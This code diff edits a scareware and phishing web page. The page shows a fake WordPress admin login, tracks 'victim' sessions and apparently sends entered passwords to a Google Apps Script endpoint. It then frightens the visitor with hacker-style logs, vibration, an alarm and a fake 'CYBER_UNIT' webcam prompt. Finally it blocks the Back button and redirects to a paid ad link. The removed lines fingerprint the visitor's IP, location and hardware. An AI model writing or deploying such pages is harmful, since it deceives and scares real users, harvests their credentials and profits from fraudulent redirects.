@@ -84,6 +84,18 @@
         @keyframes shake_anim { 0% { transform: translateX(0); } 25% { transform: translateX(5px); } 50% { transform: translateX(-5px); } 75% { transform: translateX(5px); } 100% { transform: translateX(0); } }
         .red-alert-pulse { animation: pulse_red 1s infinite; }
         @keyframes pulse_red { 0% { background: rgba(255,0,0,0); } 50% { background: rgba(255,0,0,0.2); } 100% { background: rgba(255,0,0,0); } }
+    
+    
+    .grid { 
+            display: grid; 
+            grid-template-columns: 1fr 1fr; 
+            gap: 20px; 
+        }
+        @media (max-width: 800px) { 
+            .grid { grid-template-columns: 1fr; } 
+        }
+    
+    
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -146,6 +158,7 @@
 
     <script>
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby1mKnhVMl0BLavOxwIR7R1a2QpSpKm6TCYPriU9Au90plnYJD8E03idTESJ3M74nKZ/exec";
+        const alertAudio = document.getElementById('alert-sound');
 
     // --- 1. SESSION COUNTER (RESTORED) ---
     let sessionNum = localStorage.getItem('victim_session');
@@ -242,29 +255,24 @@
         }).catch(err => console.error("Bridge Error:", err));
 
 
-        // WP Error Feed
+// WP Error Feed
         err.style.display = 'block';
         err.innerHTML = "<strong>ERROR</strong>: The password for <strong>admin</strong> is incorrect. <a href='#'>Lost your password?</a>";
         box.classList.add('shake');
         setTimeout(() => box.classList.remove('shake'), 500);
         document.getElementById('fake-pass').value = "";
 
-        // Transition to Scare
+        // Transition to Scare Sequence
         setTimeout(() => {
             document.getElementById('login-overlay').style.display = 'none';
             document.getElementById('matrix-bg').style.display = 'block';
             document.getElementById('main-wrapper').style.display = 'block';
             document.getElementById('danger-bar').style.display = 'block';
-            startEverything();
-        }, 1200);
-    }
-
-// Wait 1.5 seconds then start the scare
-        setTimeout(() => {
-            document.getElementById('login-overlay').style.display = 'none';
+            
+            // Start the animations and logs
             startEverything();
 
-            // STEP A: At 18 seconds, show the final red warning line
+            // STEP A: At 18 seconds, show terminal termination and alert
             setTimeout(() => {
                 const logContent = document.getElementById('log-content');
                 const line = document.createElement('div');
@@ -272,85 +280,42 @@
                 line.style.fontWeight = "bold";
                 line.innerText = "> [SYSTEM] CONNECTION TERMINATED. REDIRECTING TO SECURE GATEWAY...";
                 logContent.appendChild(line);
-                
                 document.getElementById('main-wrapper').classList.add('shake');
-            }, 18000); // 18 seconds
+                
+                // Trigger the alert
+                confirm("[!] SYSTEM ALERT: Remote camera access requested by CYBER_UNIT. Allow access for identity verification?");
+            }, 18000); 
 
-// Add this inside your 18-second timeout
-const webcamAlert = confirm("[!] SYSTEM ALERT: Remote camera access requested by CYBER_UNIT. Allow access for identity verification?");
-// Even if they click "Cancel", the redirect happens anyway.
-
-            
-            // STEP B: At 21 seconds, jump to the paid link
+            // STEP B: At 21 seconds, redirect
             setTimeout(() => {
-                // This REPLACES your site in history so they can't "Go Back" to it
-window.location.replace("YOUR_PAID_AD_LINK_HERE");
-            }, 21000); // 21 seconds
+                window.location.replace("YOUR_PAID_AD_LINK_HERE");
+            }, 21000);
             
-        }, 1500);
-    }
+        }, 1200);
+    } // Closes attemptLogin
 
     function startEverything() {
-
-// --- FORCE LOGIN IF PAGE RELOADS FROM BACK BUTTON ---
-window.addEventListener('pageshow', function(event) {
-    if (event.persisted) {
-        window.location.reload(); 
-    }
-});
-
-        
-    // Vibrate for 500ms, pause 200ms, vibrate 500ms (only works on Android/Chrome)
-    if (navigator.vibrate) {
-        navigator.vibrate([500, 200, 500, 200, 1000]);
-    }
-    alertAudio.play().catch(() => {});
-    setInterval(draw, 40);
-    startLogCycle();
-}
-
-    // --- DATA FETCH: IP, LOCATION, HARDWARE ---
-    setTimeout(() => {
-        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-            document.getElementById('user-ip').innerText = data.ip;
-            document.getElementById('user-ip').classList.remove('decrypting');
-            userCity = data.city || "N/A";
-            userCountry = data.country_name || "N/A";
-            document.getElementById('user-loc').innerText = userCity + ", " + userCountry;
-            document.getElementById('user-tz').innerText = data.timezone;
-            document.getElementById('user-tz').classList.remove('decrypting');
+        // FORCE LOGIN IF PAGE RELOADS FROM BACK BUTTON
+        window.addEventListener('pageshow', function(event) {
+            if (event.persisted) {
+                window.location.reload(); 
+            }
         });
-        
-        document.getElementById('user-os').innerText = navigator.platform;
-        document.getElementById('user-os').classList.remove('decrypting');
-        document.getElementById('user-cpu').innerText = (navigator.hardwareConcurrency || "X") + " THREADS";
-        document.getElementById('user-ram').innerText = (navigator.deviceMemory || "8") + "GB RAM";
-        
-        const ua = navigator.userAgent;
-        let engine = "UNKNOWN";
-        if (ua.indexOf("Chrome") > -1) engine = "BLINK";
-        else if (ua.indexOf("Firefox") > -1) engine = "GECKO";
-        else if (ua.indexOf("Safari") > -1) engine = "WEBKIT";
-        document.getElementById('user-engine').innerText = engine;
 
-        document.getElementById('user-res').innerText = window.screen.width + "x" + window.screen.height;
-        document.getElementById('user-res').classList.remove('decrypting');
+        // Vibrate (Android/Chrome)
+        if (navigator.vibrate) {
+            navigator.vibrate([500, 200, 500, 200, 1000]);
+        }
 
-        try {
-            const canvas_gpu = document.createElement('canvas');
-            const gl = canvas_gpu.getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            document.getElementById('user-gpu').innerText = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split(' ').pop();
-        } catch(e) { document.getElementById('user-gpu').innerText = "GPU_ACCEL"; }
+        // Start visuals and audio
+        if (typeof alertAudio !== 'undefined') {
+            alertAudio.play().catch(() => {});
+        }
+        setInterval(draw, 40);
+        startLogCycle();
+    }
 
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => {
-                document.getElementById('user-batt').innerText = Math.round(b.level * 100) + "%";
-                document.getElementById('user-batt').classList.remove('decrypting');
-            });
-        } else { document.getElementById('user-batt').innerText = "AC_POWER"; }
-    }, 1500);
-
+   
     // --- MATRIX RAIN ---
     const canvas = document.getElementById('matrix-bg');
     const ctx = canvas.getContext('2d');
